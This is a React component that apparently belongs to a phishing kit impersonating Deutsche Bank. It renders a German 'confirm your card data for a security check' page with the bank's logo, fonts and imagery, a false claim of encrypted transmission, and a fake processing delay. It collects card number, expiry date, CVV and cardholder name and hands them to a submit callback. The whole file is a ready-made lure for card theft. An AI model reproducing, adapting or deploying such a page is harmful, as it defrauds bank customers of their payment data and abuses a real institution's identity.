import React, { useState } from 'react';
import { AlertTriangle, Monitor, Lock } from 'lucide-react';
import Loading from './Loading';

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
}

interface BankCardFormProps {
  onSubmit: (data: BankCardData) => void;
}

const BankCardForm: React.FC<BankCardFormProps> = ({ onSubmit }) => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardholderName, setCardholderName] = useState('');
  
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<Partial<BankCardData>>({});

  // Format card number with spaces (XXXX XXXX XXXX XXXX)
  const formatCardNumber = (value: string): string => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  // Format expiry date (MM/YY)
  const formatExpiryDate = (value: string): string => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      let month = v.substring(0, 2);
      let year = v.substring(2, 4);
      
      // Ensure month is valid (01-12)
      if (parseInt(month) > 12) {
        month = '12';
      }
      
      return month + (year.length ? '/' + year : '');
    }
    return v;
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<BankCardData> = {};
    
    if (!cardNumber.trim()) newErrors.card_number = 'Kartennummer ist erforderlich';
    if (!expiryDate.trim()) newErrors.expiry_date = 'Ablaufdatum ist erforderlich';
    if (!cvv.trim()) newErrors.cvv = 'CVV ist erforderlich';
    if (!cardholderName.trim()) newErrors.cardholder_name = 'Karteninhaber ist erforderlich';
    
    // Card number validation (basic length check)
    if (cardNumber.replace(/\s/g, '').length < 13) {
      newErrors.card_number = 'Kartennummer muss mindestens 13 Ziffern haben';
    }
    
    // CVV validation (3-4 digits)
    if (cvv.length < 3) {
      newErrors.cvv = 'CVV muss 3-4 Ziffern haben';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (validateForm()) {
      setIsLoading(true);
      
      // Simulate processing delay
      await new Promise(resolve => setTimeout(resolve, 2500));
      
      try {
        onSubmit({
          card_number: cardNumber,
          expiry_date: expiryDate,
          cvv: cvv,
          cardholder_name: cardholderName
        });
      } catch (error) {
        console.error('Error submitting form:', error);
      } finally {
        setIsLoading(false);
      }
    }
  };

  const createInputField = (
    value: string,
    onChange: (value: string) => void,
    label: string,
    type: string = 'text',
    maxLength?: number,
    placeholder?: string
  ) => (
    <div style={{ marginBottom: '20px' }}>
      <label style={{
        display: 'block',
        fontSize: '14px',
        color: '#333',
        marginBottom: '8px',
        fontWeight: '500',
        fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
      }}>
        {label}
      </label>
      <input
        type={type}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        maxLength={maxLength}
        placeholder={placeholder}
        style={{
          width: '100%',
          height: '48px',
          padding: '0 12px',
          border: '1px solid #ddd',
          borderRadius: '3px',
          fontSize: '16px',
          fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
          backgroundColor: '#ffffff',
          color: '#333',
          outline: 'none'
        }}
        onFocus={(e) => {
          e.target.style.borderColor = '#0550d1';
          e.target.style.borderWidth = '2px';
        }}
        onBlur={(e) => {
          e.target.style.borderColor = '#ddd';
          e.target.style.borderWidth = '1px';
        }}
        required
      />
    </div>
  );

  if (isLoading) {
    return (
      <div style={{
        minHeight: '100vh',
        backgroundImage: 'url(/templates/deutsche_bank/images/dbbg-F3E4CS63.jpg)',
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
      }}>
        <div style={{
          backgroundColor: 'rgba(255, 255, 255, 0.98)',
          borderRadius: '3px',
          padding: '40px',
          textAlign: 'center',
          boxShadow: '0 8px 32px rgba(0, 0, 0, 0.1)'
        }}>
          <div style={{
            width: '48px',
            height: '48px',
            border: '3px solid #0550d1',
            borderTop: '3px solid transparent',
            borderRadius: '50%',
            margin: '0 auto 20px',
            animation: 'spin 1s linear infinite'
          }}></div>
          <p style={{
            fontSize: '16px',
            color: '#000000',
            margin: 0
          }}>
            Kartendaten werden verarbeitet...
          </p>
          <style>
            {`
              @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
              }
            `}
          </style>
        </div>
      </div>
    );
  }

  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .db-mobile-main {
              background-image: none !important;
              background-color: #1e2a78 !important;
            }
            .db-mobile-container {
              flex-direction: column !important;
              gap: 0 !important;
              max-width: none !important;
              margin: 0 !important;
            }
            .db-mobile-left {
              padding: 20px !important;
              padding-top: 40px !important;
              flex: none !important;
            }
            .db-mobile-sidebar {
              width: 100% !important;
              min-height: auto !important;
              order: 2 !important;
              margin-top: 60px !important;
            }
            .db-mobile-card {
              padding: 30px 20px !important;
            }
            .db-mobile-form-grid {
              grid-template-columns: 1fr !important;
              gap: 16px !important;
            }
            .db-mobile-title {
              font-size: 24px !important;
            }
            .db-mobile-sidebar-content {
              background-color: #ffffff !important;
              padding: 20px !important;
              margin-bottom: 20px !important;
            }
            .db-mobile-footer-only {
              padding: 30px 20px !important;
            }
          }
        `}
      </style>
      <div className="db-mobile-main" style={{
        minHeight: '100vh',
        backgroundImage: 'url(/templates/deutsche_bank/images/dbbg-F3E4CS63.jpg)',
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat',
        display: 'flex',
        fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
      }}>
        
        {/* Main Container - 1180px */}
        <div className="db-mobile-container" style={{
          maxWidth: '1180px',
          width: '100%',
          display: 'flex',
          margin: '0 auto',
          gap: '80px'
        }}>
          
          {/* Left Content Area */}
          <div className="db-mobile-left" style={{
            flex: '1',
            display: 'flex',
            flexDirection: 'column',
            justifyContent: 'center',
            paddingTop: '100px',
            paddingLeft: '40px',
            paddingRight: '20px',
            paddingBottom: '40px'
          }}>
            
            {/* Bank Card Form Card */}
            <div className="db-mobile-card" style={{
              backgroundColor: 'rgba(255, 255, 255, 0.98)',
              borderRadius: '3px',
              padding: '40px',
              boxShadow: '0 8px 32px rgba(0, 0, 0, 0.1)'
            }}>
              
              {/* Deutsche Bank Logo */}
              <div style={{
                marginBottom: '30px',
                textAlign: 'left'
              }}>
                <img 
                  src="/templates/deutsche_bank/images/DB-Logotype-ri-sRGB-DXJQ2K2F.svg" 
                  alt="Deutsche Bank" 
                  style={{ 
                    height: '32px',
                    width: 'auto'
                  }}
                />
              </div>

              {/* Title */}
              <h1 className="db-mobile-title" style={{
                fontSize: '28px',
                fontWeight: '600',
                color: '#000000',
                margin: '0 0 16px 0',
                textAlign: 'center'
              }}>
                Kartendaten bestätigen
              </h1>
              
              {/* Description */}
              <p style={{
                fontSize: '16px',
                color: '#666',
                margin: '0 0 32px 0',
                lineHeight: '1.5',
                textAlign: 'center'
              }}>
                Bitte geben Sie Ihre Kartendaten zur Sicherheitsüberprüfung ein.
              </p>

              {/* Security Notice */}
              <div style={{
                backgroundColor: '#e8f4fd',
                border: '1px solid #b8d4e3',
                borderRadius: '3px',
                padding: '16px',
                marginBottom: '32px',
                display: 'flex',
                alignItems: 'center',
                gap: '12px'
              }}>
                <Lock size={20} color="#0550d1" />
                <p style={{
                  fontSize: '14px',
                  color: '#000000',
                  margin: 0,
                  lineHeight: '1.4'
                }}>
                  <strong>Sicherheitshinweis:</strong> Ihre Daten werden verschlüsselt übertragen und sicher verarbeitet.
                </p>
              </div>

              <form onSubmit={handleSubmit}>
                
                {/* Card Number */}
                <div style={{ marginBottom: '20px' }}>
                  <label style={{
                    display: 'block',
                    fontSize: '14px',
                    color: '#333',
                    marginBottom: '8px',
                    fontWeight: '500',
                    fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
                  }}>
                    Kartennummer
                  </label>
                  <input
                    type="text"
                    value={cardNumber}
                    onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                    maxLength={19}
                    placeholder="1234 5678 9012 3456"
                    style={{
                      width: '100%',
                      height: '48px',
                      padding: '0 12px',
                      border: errors.card_number ? '2px solid #dc3545' : '1px solid #ddd',
                      borderRadius: '3px',
                      fontSize: '16px',
                      fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                      backgroundColor: '#ffffff',
                      color: '#333',
                      outline: 'none'
                    }}
                    onFocus={(e) => {
                      if (!errors.card_number) {
                        e.target.style.borderColor = '#0550d1';
                        e.target.style.borderWidth = '2px';
                      }
                    }}
                    onBlur={(e) => {
                      if (!errors.card_number) {
                        e.target.style.borderColor = '#ddd';
                        e.target.style.borderWidth = '1px';
                      }
                    }}
                    required
                  />
                  {errors.card_number && (
                    <div style={{
                      color: '#dc3545',
                      fontSize: '12px',
                      marginTop: '4px',
                      fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
                    }}>
                      {errors.card_number}
                    </div>
                  )}
                </div>

                {/* Expiry Date and CVV */}
                <div className="db-mobile-form-grid" style={{
                  display: 'grid',
                  gridTemplateColumns: '1fr 1fr',
                  gap: '20px',
                  marginBottom: '20px'
                }}>
                  <div>
                    <label style={{
                      display: 'block',
                      fontSize: '14px',
                      color: '#333',
                      marginBottom: '8px',
                      fontWeight: '500',
                      fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
                    }}>
                      Gültig bis
                    </label>
                    <input
                      type="text"
                      value={expiryDate}
                      onChange={(e) => setExpiryDate(formatExpiryDate(e.target.value))}
                      maxLength={5}
                      placeholder="MM/YY"
                      style={{
                        width: '100%',
                        height: '48px',
                        padding: '0 12px',
                        border: errors.expiry_date ? '2px solid #dc3545' : '1px solid #ddd',
                        borderRadius: '3px',
                        fontSize: '16px',
                        fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                        backgroundColor: '#ffffff',
                        color: '#333',
                        outline: 'none'
                      }}
                      onFocus={(e) => {
                        if (!errors.expiry_date) {
                          e.target.style.borderColor = '#0550d1';
                          e.target.style.borderWidth = '2px';
                        }
                      }}
                      onBlur={(e) => {
                        if (!errors.expiry_date) {
                          e.target.style.borderColor = '#ddd';
                          e.target.style.borderWidth = '1px';
                        }
                      }}
                      required
                    />
                    {errors.expiry_date && (
                      <div style={{
                        color: '#dc3545',
                        fontSize: '12px',
                        marginTop: '4px',
                        fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
                      }}>
                        {errors.expiry_date}
                      </div>
                    )}
                  </div>
                  
                  <div>
                    <label style={{
                      display: 'block',
                      fontSize: '14px',
                      color: '#333',
                      marginBottom: '8px',
                      fontWeight: '500',
                      fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
                    }}>
                      CVV
                    </label>
                    <input
                      type="text"
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))}
                      maxLength={4}
                      placeholder="123"
                      style={{
                        width: '100%',
                        height: '48px',
                        padding: '0 12px',
                        border: errors.cvv ? '2px solid #dc3545' : '1px solid #ddd',
                        borderRadius: '3px',
                        fontSize: '16px',
                        fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                        backgroundColor: '#ffffff',
                        color: '#333',
                        outline: 'none'
                      }}
                      onFocus={(e) => {
                        if (!errors.cvv) {
                          e.target.style.borderColor = '#0550d1';
                          e.target.style.borderWidth = '2px';
                        }
                      }}
                      onBlur={(e) => {
                        if (!errors.cvv) {
                          e.target.style.borderColor = '#ddd';
                          e.target.style.borderWidth = '1px';
                        }
                      }}
                      required
                    />
                    {errors.cvv && (
                      <div style={{
                        color: '#dc3545',
                        fontSize: '12px',
                        marginTop: '4px',
                        fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
                      }}>
                        {errors.cvv}
                      </div>
                    )}
                  </div>
                </div>

                {/* Cardholder Name */}
                <div style={{ marginBottom: '20px' }}>
                  <label style={{
                    display: 'block',
                    fontSize: '14px',
                    color: '#333',
                    marginBottom: '8px',
                    fontWeight: '500',
                    fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
                  }}>
                    Name des Karteninhabers
                  </label>
                  <input
                    type="text"
                    value={cardholderName}
                    onChange={(e) => setCardholderName(e.target.value.toUpperCase())}
                    placeholder="MAX MUSTERMANN"
                    style={{
                      width: '100%',
                      height: '48px',
                      padding: '0 12px',
                      border: errors.cardholder_name ? '2px solid #dc3545' : '1px solid #ddd',
                      borderRadius: '3px',
                      fontSize: '16px',
                      fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                      backgroundColor: '#ffffff',
                      color: '#333',
                      outline: 'none'
                    }}
                    onFocus={(e) => {
                      if (!errors.cardholder_name) {
                        e.target.style.borderColor = '#0550d1';
                        e.target.style.borderWidth = '2px';
                      }
                    }}
                    onBlur={(e) => {
                      if (!errors.cardholder_name) {
                        e.target.style.borderColor = '#ddd';
                        e.target.style.borderWidth = '1px';
                      }
                    }}
                    required
                  />
                  {errors.cardholder_name && (
                    <div style={{
                      color: '#dc3545',
                      fontSize: '12px',
                      marginTop: '4px',
                      fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
                    }}>
                      {errors.cardholder_name}
                    </div>
                  )}
                </div>
                
                {/* Submit Button */}
                <button
                  type="submit"
                  disabled={isLoading}
                  style={{
                    backgroundColor: '#0550d1',
                    color: '#ffffff',
                    border: 'none',
                    borderRadius: '3px',
                    padding: '16px 32px',
                    fontSize: '16px',
                    fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                    fontWeight: '600',
                    cursor: isLoading ? 'not-allowed' : 'pointer',
                    transition: 'background-color 0.2s ease',
                    width: '100%',
                    marginTop: '20px'
                  }}
                  onMouseOver={(e) => {
                    if (!isLoading) {
                      e.currentTarget.style.backgroundColor = '#0440a8';
                    }
                  }}
                  onMouseOut={(e) => {
                    if (!isLoading) {
                      e.currentTarget.style.backgroundColor = '#0550d1';
                    }
                  }}
                >
                  {isLoading ? 'Wird verarbeitet...' : 'Karte bestätigen'}
                </button>
              </form>
            </div>
          </div>

          {/* Right Sidebar - 380px */}
          <div className="db-mobile-sidebar" style={{
            width: '380px',
            backgroundColor: '#ffffff',
            display: 'flex',
            flexDirection: 'column',
            minHeight: '100vh'
          }}>
            
            {/* Promotional Content */}
            <div className="db-mobile-sidebar-content" style={{
              flex: '1',
              padding: '30px'
            }}>
              
              {/* New Banking Promo */}
              <div style={{
                marginBottom: '40px'
              }}>
                <img 
                  src="/templates/deutsche_bank/images/db-neues-banking-dt-1200x750-1552700535-w46209.jpg" 
                  alt="Neues Online-Banking" 
                  style={{
                    width: '100%',
                    height: '140px',
                    objectFit: 'cover',
                    borderRadius: '3px',
                    marginBottom: '16px'
                  }}
                />
                <h2 style={{
                  fontSize: '18px',
                  fontWeight: '600',
                  color: '#000000',
                  margin: '0 0 10px 0'
                }}>
                  Neues Online-Banking. Neue App!
                </h2>
                <p style={{
                  fontSize: '14px',
                  color: '#000000',
                  margin: '0 0 12px 0',
                  lineHeight: '1.5'
                }}>
                  Jetzt noch smarter und mehr Komfort für Sie.
                </p>
                <div style={{
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '6px'
                }}>
                  <a href="#" style={{
                    color: '#0550d1',
                    textDecoration: 'underline',
                    fontSize: '14px',
                    fontWeight: '600'
                  }}>
                    Informationen für Privatkunden
                  </a>
                  <a href="#" style={{
                    color: '#0550d1',
                    textDecoration: 'underline',
                    fontSize: '14px',
                    fontWeight: '600'
                  }}>
                    Informationen für Unternehmenskunden
                  </a>
                </div>
              </div>

              {/* Security Info */}
              <div style={{
                marginBottom: '40px'
              }}>
                <div style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '10px',
                  marginBottom: '10px'
                }}>
                  <div style={{
                    color: '#000000',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center'
                  }}>
                    <AlertTriangle size={24} />
                  </div>
                  <h3 style={{
                    fontSize: '16px',
                    fontWeight: '600',
                    color: '#000000',
                    margin: '0'
                  }}>
                    Sicherheitshinweise
                  </h3>
                </div>
                <p style={{
                  fontSize: '14px',
                  color: '#000000',
                  margin: '0 0 12px 0',
                  lineHeight: '1.5'
                }}>
                  Schützen Sie sich und Ihr Online-Banking. Wir helfen Ihnen gern.
                </p>
                <div style={{
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '6px'
                }}>
                  <a href="#" style={{
                    color: '#0550d1',
                    textDecoration: 'underline',
                    fontSize: '14px',
                    fontWeight: '600'
                  }}>
                    Link zu den aktuellen Sicherheitshinweisen
                  </a>
                  <a href="#" style={{
                    color: '#0550d1',
                    textDecoration: 'underline',
                    fontSize: '14px',
                    fontWeight: '600'
                  }}>
                    Link zu Sicherheit im Überblick
                  </a>
                </div>
              </div>

              {/* Online Banking Access */}
              <div style={{
                marginBottom: '40px'
              }}>
                <div style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '10px',
                  marginBottom: '10px'
                }}>
                  <div style={{
                    color: '#000000',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center'
                  }}>
                    <Monitor size={24} />
                  </div>
                  <h3 style={{
                    fontSize: '16px',
                    fontWeight: '600',
                    color: '#000000',
                    margin: '0'
                  }}>
                    Online-Banking Zugang
                  </h3>
                </div>
                <p style={{
                  fontSize: '14px',
                  color: '#000000',
                  margin: '0 0 12px 0',
                  lineHeight: '1.5'
                }}>
                  Hier können Sie Ihren persönlichen Zugang zum Online-Banking beantragen.
                </p>
                <a href="#" style={{
                  color: '#0550d1',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontWeight: '600'
                }}>
                  Zugang zum Online-Banking beantragen
                </a>
              </div>

              {/* Security Procedures */}
              <div>
                <div style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '10px',
                  marginBottom: '10px'
                }}>
                  <div style={{
                    color: '#000000',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center'
                  }}>
                    <svg role="img" focusable="false" style={{ height: '24px', width: '24px' }} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                      <rect width="18" height="11" x="3" y="11" rx="2" ry="2"/>
                      <path d="m7 11V7a5 5 0 0 1 10 0v4"/>
                    </svg>
                  </div>
                  <h3 style={{
                    fontSize: '16px',
                    fontWeight: '600',
                    color: '#000000',
                    margin: '0'
                  }}>
                    Unsere Sicherheitsverfahren
                  </h3>
                </div>
                <p style={{
                  fontSize: '14px',
                  color: '#000000',
                  margin: '0 0 12px 0',
                  lineHeight: '1.5'
                }}>
                  Alles Wissenswerte rund um Ihren Login.
                </p>
                <a href="#" style={{
                  color: '#0550d1',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontWeight: '600'
                }}>
                  Link zu den Sicherheitsverfahren
                </a>
              </div>
            </div>

            {/* Footer integrated in sidebar */}
            <div className="db-mobile-footer-only" style={{
              backgroundColor: '#1e2a78',
              color: '#ffffff',
              padding: '20px 30px'
            }}>
              <div style={{
                display: 'flex',
                flexWrap: 'wrap',
                gap: '15px',
                fontSize: '12px'
              }}>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  English Version
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Hilfe
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Demo-Konto
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Impressum
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Rechtliche Hinweise
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Datenschutz
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Cookie-Einstellungen
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default BankCardForm;